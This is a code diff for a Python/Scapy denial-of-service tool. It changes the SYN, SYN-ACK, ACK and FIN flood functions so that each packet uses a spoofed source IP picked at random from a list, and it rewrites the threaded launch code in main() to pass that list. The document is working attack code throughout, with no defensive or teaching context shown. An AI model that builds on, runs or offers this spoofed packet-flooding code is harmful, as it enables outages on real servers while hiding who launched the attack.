@@ -74,9 +74,10 @@ def send_udp_packet(server_ip, server_port, source_ips, count, progress_bar):
         time.sleep(1)  # Update every second
 
 #Function for the Syn Flood Attack
-def syn_flood_attack(server_ip, source_ip, server_port, count, progress_bar):
+def syn_flood_attack(server_ip, server_port, source_ips, count, progress_bar):
      global sent_packets, start_time
      while sent_packets < count:
+        source_ip = random.choice(source_ips)
         syn_flood = IP(src=source_ip,dst=server_ip)/TCP(dport=server_port,flags="S",seq=RandShort()) #Set the syn flag to 1 only
         send(syn_flood, verbose=0)
         with sent_packets_lock:
@@ -87,9 +88,10 @@ def syn_flood_attack(server_ip, source_ip, server_port, count, progress_bar):
 
         time.sleep(1)
 #Function for the Syn-Ack Flood Attack
-def synack_flood_attack(server_ip, source_ip,server_port, count, progress_bar):
+def synack_flood_attack(server_ip, server_port, source_ips, count, progress_bar):
      global sent_packets, start_time
      while sent_packets < count:
+        source_ip = random.choice(source_ips)
         synack_flood = IP(src=source_ip,dst=server_ip)/TCP(dport=server_port,flags="SA",seq=RandShort()) #Set the syn-ack flag to 1 only
         send(synack_flood, verbose=0)
         with sent_packets_lock:
@@ -100,9 +102,10 @@ def synack_flood_attack(server_ip, source_ip,server_port, count, progress_bar):
 
         time.sleep(1)
 #Function for the Ack Flood Attack
-def ack_flood_attack(server_ip, source_ip, server_port, count, progress_bar):
+def ack_flood_attack(server_ip, server_port, source_ips, count, progress_bar):
      global sent_packets, start_time
      while sent_packets < count:
+        source_ip = random.choice(source_ips)
         ack_flood = IP(src=source_ip,dst=server_ip)/TCP(dport=server_port,flags="A",seq=RandShort()) #Set the ack flag to 1 only
         send(ack_flood, verbose=0)
         with sent_packets_lock:
@@ -113,9 +116,10 @@ def ack_flood_attack(server_ip, source_ip, server_port, count, progress_bar):
 
         time.sleep(1)
 #Function for the Fin Flood Attacks
-def fin_flood_attack(server_ip, source_ip,server_port, count, progress_bar):
+def fin_flood_attack(server_ip, server_port, source_ips, count, progress_bar):
      global sent_packets, start_time
      while sent_packets < count:
+        source_ip = random.choice(source_ips)
         fin_flood = IP(src=source_ip,dst=server_ip)/TCP(dport=server_port,flags="F",seq=RandShort())
         send(fin_flood, verbose=0)
         with sent_packets_lock:
@@ -193,8 +197,7 @@ def main():
             if attack_number == 1:
                 attack_type = "Syn Flood"
                 for _ in range(number_of_packets):
-                    thread = threading.Thread(target=syn_flood_attack,
-                                              args=(server_ip, server_port, number_of_packets, progress_bar))
+                    thread = threading.Thread(target=syn_flood_attack,args=(server_ip, server_port, source_ips, number_of_packets, progress_bar))
                     threads.append(thread)
                     thread.start()
 
@@ -204,8 +207,7 @@ def main():
             elif attack_number == 2:
                 attack_type = "Syn-Ack Flood"
                 for _ in range(number_of_packets):
-                    thread = threading.Thread(target=synack_flood_attack,
-                                              args=(server_ip, server_port, number_of_packets, progress_bar))
+                    thread = threading.Thread(target=synack_flood_attack,args=(server_ip, server_port, source_ips, number_of_packets, progress_bar))
                     threads.append(thread)
                     thread.start()
 
@@ -215,8 +217,7 @@ def main():
             elif attack_number == 3:
                 attack_type = "Ack Flood"
                 for _ in range(number_of_packets):
-                    thread = threading.Thread(target=ack_flood_attack,
-                                              args=(server_ip, server_port, number_of_packets, progress_bar))
+                    thread = threading.Thread(target=ack_flood_attack,args=(server_ip, server_port, source_ips, number_of_packets, progress_bar))
                     threads.append(thread)
                     thread.start()
 
@@ -225,8 +226,7 @@ def main():
             elif attack_number == 4:
                 attack_type = "Fin Flood"
                 for _ in range(number_of_packets):
-                    thread = threading.Thread(target=fin_flood_attack,
-                                              args=(server_ip, server_port, number_of_packets, progress_bar))
+                    thread = threading.Thread(target=fin_flood_attack,args=(server_ip, server_port, source_ips, number_of_packets, progress_bar))
                     threads.append(thread)
                     thread.start()
 
